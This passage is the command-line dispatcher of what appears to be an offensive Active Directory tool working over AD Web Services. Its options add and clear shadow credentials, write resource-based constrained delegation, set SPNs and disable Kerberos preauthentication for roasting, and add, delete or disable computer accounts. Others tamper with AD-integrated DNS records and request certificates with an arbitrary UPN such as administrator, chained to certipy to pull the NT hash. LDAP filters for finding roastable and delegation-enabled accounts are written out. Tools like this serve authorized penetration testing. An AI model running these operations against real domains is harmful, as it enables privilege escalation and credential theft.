    )
    wstep_grp.add_argument(
        "--template",
        dest="wstep_template",
        action="store",
        metavar="NAME",
        help="Certificate template name (resolved to OID via MS-XCEP)",
    )
    wstep_grp.add_argument(
        "--upn",
        dest="wstep_upn",
        action="store",
        metavar="UPN",
        help="UPN to embed as SAN otherName (e.g. administrator@jjk.local)",
    )
    wstep_grp.add_argument(
        "--out",
        dest="wstep_out",
        action="store",
        metavar="PATH",
        help="Output .pfx path for --enroll-ws",
    )
    wstep_grp.add_argument(
        "--insecure-ssl",
        dest="insecure_ssl",
        action="store_true",
        help="Disable TLS verification for CES/CEP (lab only)",
    )
    wstep_grp.add_argument(
        "--user-agent",
        dest="user_agent",
        action="store",
        metavar="UA",
        default=None,
        help=(
            "Override User-Agent for MS-XCEP/MS-WSTEP requests "
            "(default: Microsoft Web Services Client Protocol fingerprint, "
            "matching certreq.exe)"
        ),
    )
    wstep_grp.add_argument(
        "--auth-dc",
        default=None,
        metavar="IP_OR_FQDN",
        help=(
            "After successful --enroll-ws, chain certipy auth against the "
            "given DC IP or FQDN to retrieve the NT hash. Requires certipy "
            "in PATH. Example: --auth-dc 192.168.56.101"
        ),
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.start_sid and options.end_sid:
        try:
            start_parts = ADWSConnect._sid_parts(options.start_sid)
            end_parts = ADWSConnect._sid_parts(options.end_sid)
            ADWSConnect._sid_filter_value(options.start_sid)
            ADWSConnect._sid_filter_value(options.end_sid)
        except ValueError as error:
            parser.error(str(error))
        if start_parts[:-1] != end_parts[:-1]:
            parser.error("--start-sid and --end-sid must use the same SID authority")
        if start_parts[-1] > end_parts[-1]:
            parser.error("--start-sid must not be greater than --end-sid")
    else:
        if options.start_sid or options.end_sid:
            parser.error("--start-sid and --end-sid must be provided together")

    if options.show:
        logger.init(options.ts)
        try:
            objects, pages, invalid = ADWSConnect.print_soapy_data(
                ".soapy_data", parse_values=options.parse
            )
        except OSError as error:
            logging.critical("Unable to read .soapy_data: %s", error)
            raise SystemExit(1)

        logging.info(
            "Recovered %d objects from %d pages; ignored %d invalid records",
            objects,
            pages,
            invalid,
        )
        return

    if options.kerberos and options.nthash:
        parser.error("-k/--kerberos cannot be used with -nt/--nthash")

    # Check if connection is required
    if options.connection is None:
        parser.print_help()
        sys.exit(1)

    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)

    if domain is None:
        domain = ""

    if options.kerberos and (not domain or not username):
        from impacket.krb5.ccache import CCache

        domain, username, _, _ = CCache.parseFile(
            domain=domain,
            username=username,
            target=f"LDAP/{remoteName}",
        )

    # Ask for password if missing and username present
    if password == "" and username != "" and options.nthash is None and not options.kerberos:
        from getpass import getpass
        password = getpass("Password:")

    queries: dict[str, str] = {
        "users": "(&(objectClass=user)(objectCategory=person))",
        "computers": "(objectClass=computer)",
        "constrained": "(msds-allowedtodelegateto=*)",
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "asreproastable":"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "admins": "(&(objectClass=user)(adminCount=1))",
        "groups": "(objectCategory=group)",
        "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)",
    }

    ldap_query = []
    ldap_query.append(options.query)
    for flag, this_query in queries.items():
        if getattr(options, flag):
            ldap_query.append(this_query)

    if not domain:
        logging.critical('"domain" must be specified')
        raise SystemExit()

    if not username:
        logging.critical('"username" must be specified')
        raise SystemExit()

    auth = KerberosAuth() if options.kerberos else NTLMAuth(password=password, hashes=options.nthash)

    try:

        if options.bind:
            if not bind_adws(
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
            ):
                raise SystemExit(1)

        elif options.shadow_creds:
            if not SHADOW_CREDS_AVAILABLE:
                logging.critical("Shadow Credentials module not available. Install dsinternals: pip install dsinternals")
                logging.critical("Use --shadow-creds-help for more information")
                raise SystemExit(1)
            
            if not options.shadow_target:
                logging.critical("--shadow-target is required for Shadow Credentials operations")
                raise SystemExit(1)
            
            if options.shadow_creds == 'list':
                shadow_credentials_list(
                    target=options.shadow_target,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )
            
            elif options.shadow_creds == 'add':
                shadow_credentials_add(
                    target=options.shadow_target,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                    filename=options.cert_filename,
                    export_type=options.cert_export,
                    pfx_password=options.cert_password,
                )
            
            elif options.shadow_creds == 'remove':
                if not options.device_id:
                    logging.critical("--device-id is required for remove action")
                    raise SystemExit(1)
                shadow_credentials_remove(
                    target=options.shadow_target,
                    device_id=options.device_id,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )
            
            elif options.shadow_creds == 'clear':
                shadow_credentials_clear(
                    target=options.shadow_target,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )
            
            elif options.shadow_creds == 'info':
                if not options.device_id:
                    logging.critical("--device-id is required for info action")
                    raise SystemExit(1)
                shadow_credentials_info(
                    target=options.shadow_target,
                    device_id=options.device_id,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )

        # RBCD
        # Generic attribute write
        elif getattr(options, "set_attribute", False):
            if not options.target_dn or not options.attribute or not options.attr_value:
                logging.critical("--set-attribute requires --target-dn, --attribute and --attr-value")
                raise SystemExit(1)
            set_generic_attribute(
                target_dn=options.target_dn,
                attribute=options.attribute,
                values=options.attr_value,
                operation=options.attr_op,
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )

        elif options.rbcd is not None:
            handle_rbcd(
                rbcd_action_or_source=options.rbcd,
                rbcd_source=options.rbcd_source,
                rbcd_target=options.rbcd_target,
                legacy_target=options.account,
                legacy_remove=options.remove,
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )

        # SPN write/remove
        elif options.spn is not None:
            if not options.account:
                logging.critical('Please specify an account with "--account"')
                raise SystemExit()
            set_spn(
                ip=remoteName,
                domain=domain,
                target=options.account,
                value=options.spn,
                username=username,
                auth=auth,
                remove=options.remove
            )

        # ASREP
        elif options.asrep:
            if not options.account:
                logging.critical('Please specify an account with "--account"')
                raise SystemExit()
            set_asrep(
                ip=remoteName,
                domain=domain,
                target=options.account,
                username=username,
                auth=auth,
                remove=options.remove
            )

        # Add computer
        elif getattr(options, "addcomputer", None) is not None:
            machine_name = None if options.addcomputer == "" else options.addcomputer
            add_computer(
                target=options.account if options.account else None,
                machine_name=machine_name,
                ou_dn=options.ou,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                remove=options.remove,
                computer_pass=options.computer_pass,
            )

        # Disable account
        elif options.disable_account:
            disable_machine_account(
                machine_name=options.disable_account,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
            )

        # Delete computer
        elif options.delete_computer:
            delete_computer(
                machine_name=options.delete_computer,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
            )

        # DNS operations
        elif options.dns_add:
            if not options.dns_ip:
                logging.critical("--dns-add requires --dns-ip")
                raise SystemExit(1)
            add_dns_record_adws(
                fqdn_record=options.dns_add,
                ip_addr=options.dns_ip,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                allow_multiple=options.allow_multiple,
                ttl=options.ttl,
                tcp=options.tcp,
            )

        elif options.dns_modify:
            if not options.dns_ip:
                logging.critical("--dns-modify requires --dns-ip")
                raise SystemExit(1)
            modify_dns_record_adws(
                fqdn_record=options.dns_modify,
                new_ip=options.dns_ip,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                ttl=options.ttl,
                tcp=options.tcp,
            )

        elif options.dns_remove:
            if not options.ldapdelete and not options.dns_ip:
                logging.critical("--dns-remove requires --dns-ip unless --ldapdelete is specified")
                raise SystemExit(1)
            remove_dns_record_adws(
                fqdn_record=options.dns_remove,
                ip_to_remove=options.dns_ip if options.dns_ip else "",
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
                ldapdelete=options.ldapdelete,
            )

        elif options.dns_tombstone:
            tombstone_dns_record_adws(
                fqdn_record=options.dns_tombstone,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
            )

        elif options.dns_resurrect:
            resurrect_dns_record_adws(
                fqdn_record=options.dns_resurrect,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
            )

        # ADCAP TranslateName
        elif options.translate_name:
            if not options.adcap_names:
                logging.critical("--translate-name requires at least one --name <DN>")
                raise SystemExit(1)
            cap_client = ADWSConnect.accounts_cap_client(
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )
            results = adcap.translate_name(
                cap_client,
                options.adcap_names,
                format_desired=options.adcap_desired,
            )
            print(f"{'Name':<60}  Result")
            print("-" * 70)
            for name_in, (name_out, code) in zip(options.adcap_names, results):
                translated = name_out if name_out is not None else "(nil)"
                print(f"{translated:<60}  {code}")

        # ADCAP GetADForest
        elif options.get_forest:
            cap_client = ADWSConnect.topology_cap_client(
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )
            forest = adcap.get_ad_forest(cap_client)
            print(_format_adcap_dict_soapy_style(forest))

        # ADCAP GetADDomain
        elif options.get_domain:
            cap_client = ADWSConnect.topology_cap_client(
                ip=remoteName, domain=domain, username=username, auth=auth,
            )
            dom = adcap.get_ad_domain(cap_client, identity=options.adcap_identity)
            print(_format_adcap_dict_soapy_style(dom))

        # ADCAP GetADDomainController
        elif options.get_dc:
            if not options.ntds_settings_dn:
                logging.critical(
                    "--get-dc requires at least one --ntds-settings-dn <DN>. "
                    "Discover them with: ldapsearch -b CN=Sites,CN=Configuration,<rootDN> "
                    "'(objectClass=nTDSDSA)' dn"
                )
                raise SystemExit(1)
            cap_client = ADWSConnect.topology_cap_client(
                ip=remoteName, domain=domain, username=username, auth=auth,
            )
            dc = adcap.get_ad_domain_controller(
                cap_client, options.ntds_settings_dn,
            )
            print(_format_adcap_dict_soapy_style(dc))

        # ADCAP GetADGroupMember / GetADPrincipalGroupMembership /
        # GetADPrincipalAuthorizationGroup — print the parsed list of
        # principals/groups as indented JSON.
        elif options.get_group_member or options.get_group_membership or options.get_auth_groups:
            import json as _json
            format_offered = (
                "DistinguishedName" if options.principal_format == "dn" else "CanonicalName"
            )
            identity = (
                options.get_group_member
                or options.get_group_membership
                or options.get_auth_groups
            )
            partition_dn = options.partition_dn
            if not partition_dn and options.principal_format == "dn":
                partition_dn = adcap.partition_dn_from_identity(identity)
            if not partition_dn:
                logging.critical(
                    "--partition-dn is required (server rejects an empty PartitionDN "
                    "with MustSupplyPartitionDn). It could not be auto-derived from "
                    "identity %r (either not a DN, or --principal-format=canonical).",
                    identity,
                )
                raise SystemExit(1)
            cap_client = ADWSConnect.accounts_cap_client(
                ip=remoteName, domain=domain, username=username, auth=auth,
            )
            if options.get_group_member:
                items = adcap.get_ad_group_member(
                    cap_client, identity, partition_dn, format_offered,
                )
            elif options.get_group_membership:
                items = adcap.get_ad_principal_group_membership(
                    cap_client, identity, partition_dn, format_offered,
                )
            else:
                items = adcap.get_ad_principal_authorization_group(
                    cap_client, identity, partition_dn, format_offered,
                )
            if isinstance(items, dict) and "error" in items:
                print(_json.dumps(items, indent=2))
            else:
                print(_format_principal_list_powershell(items))

        # ADCAP GetVersion — one short line, no table needed. The server
        # ships a version_string that already includes "Active Directory
        # Web Services vX.Y"; print it as-is when present, otherwise fall
        # back to the parsed major.minor.
        elif options.get_version:
            cap_client = ADWSConnect.topology_cap_client(
                ip=remoteName, domain=domain, username=username, auth=auth,
            )
            ver = adcap.get_version(cap_client)
            if ver["version_string"]:
                print(ver["version_string"])
            else:
                print(
                    f"Active Directory Web Services "
                    f"v{ver['version_major']}.{ver['version_minor']}"
                )

        # WS-Trust certificate enrollment (MS-XCEP + MS-WSTEP).
        # Reuse the creds already extracted from the connection string
        # (domain/user:password@host) or -nt to do an in-process AS-REQ via
        # impacket and expose the TGT through a tempdir ccache that
        # requests-gssapi can read. Without inline creds, fall back to the
        # system ccache (user ran kinit beforehand or set KRB5CCNAME).
        elif options.list_policies_ws or options.enroll_ws:
            from contextlib import nullcontext
            from src.kerb_tgt import inline_tgt_ccache

            has_inline_creds = bool(password) or bool(options.nthash)
            if has_inline_creds:
                lm_hash, nt_hash = "", ""
                if options.nthash:
                    parts = options.nthash.split(":", 1)
                    if len(parts) == 2:
                        lm_hash, nt_hash = parts
                    else:
                        nt_hash = parts[0]
                auth_ctx = inline_tgt_ccache(
                    username=username,
                    domain=domain,
                    password=password or None,
                    nt_hash=nt_hash or None,
                    lm_hash=lm_hash or None,
                    kdc_ip=remoteName,
                )
            else:
                auth_ctx = nullcontext()

            with auth_ctx:
                if options.list_policies_ws:
                    from src.cert_enroll_xcep import DEFAULT_USER_AGENT, run_list_policies

                    run_list_policies(
                        remote_name=remoteName,
                        cep_url=options.cep_url,
                        ca_name=options.wstep_ca,
                        insecure_ssl=options.insecure_ssl,
                        user_agent=options.user_agent or DEFAULT_USER_AGENT,
                    )
                else:
                    from src.cert_enroll_wstep import run_enroll
                    from src.cert_enroll_xcep import DEFAULT_USER_AGENT

                    run_enroll(
                        remote_name=remoteName,
                        ces_url=options.ces_url,
                        cep_url=options.cep_url,
                        ca_name=options.wstep_ca,
                        template_name=options.wstep_template,
                        upn=options.wstep_upn,
                        out_path=options.wstep_out,
                        insecure_ssl=options.insecure_ssl,
                        user_agent=options.user_agent or DEFAULT_USER_AGENT,
                        auth_dc=options.auth_dc,
                    )

        # Enumeration / Pull operations (default)
        else:
            if not ldap_query or all(q is None for q in ldap_query):
                logging.critical("No operation specified. Use --help for available options.")
                raise SystemExit()

            client = ADWSConnect.pull_client(
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )

            for current_query in ldap_query:
                if not current_query:
                    continue

                if options.filter is not None:
                    attributes: list = [x.strip() for x in options.filter.split(",")]
                else:
                    attributes = None
                
                if options.start_sid is not None:
                    sid_queries = ADWSConnect.sid_range_queries(
                        current_query, options.start_sid, options.end_sid
                    )
                    sid_count = (
                        ADWSConnect._sid_parts(options.end_sid)[-1]
                        - ADWSConnect._sid_parts(options.start_sid)[-1]
                        + 1
                    )
                    sid_query_count = (
                        sid_count + ADWSConnect.SID_RANGE_QUERY_CHUNK_SIZE - 1
                    ) // ADWSConnect.SID_RANGE_QUERY_CHUNK_SIZE
                else:
                    sid_queries = [(current_query, None, None)]
                    sid_query_count = 1

                for sid_query_index, (
                    sid_query,
                    chunk_start_sid,
                    chunk_end_sid,
                ) in enumerate(sid_queries, start=1):
                    if chunk_start_sid is not None:
                        print(
                            f"[*] Collecting SID batch {sid_query_index}/"
                            f"{sid_query_count}: {chunk_start_sid} through "
                            f"{chunk_end_sid}",
                            file=sys.stderr,
                            flush=True,
                        )
                    client.pull(
                        sid_query,
                        options.distinguishedname,
                        attributes,
                        print_incrementally=False,
                        parse_values=options.parse,
                        data_path=".soapy_data",
                        print_results=False,
                        start_sid=chunk_start_sid,
                        end_sid=chunk_end_sid,
                    )

    except Exception as e:
        logging.exception("Operation failed: %s", e)
        raise SystemExit(1)


if __name__ == "__main__":
    run_cli()
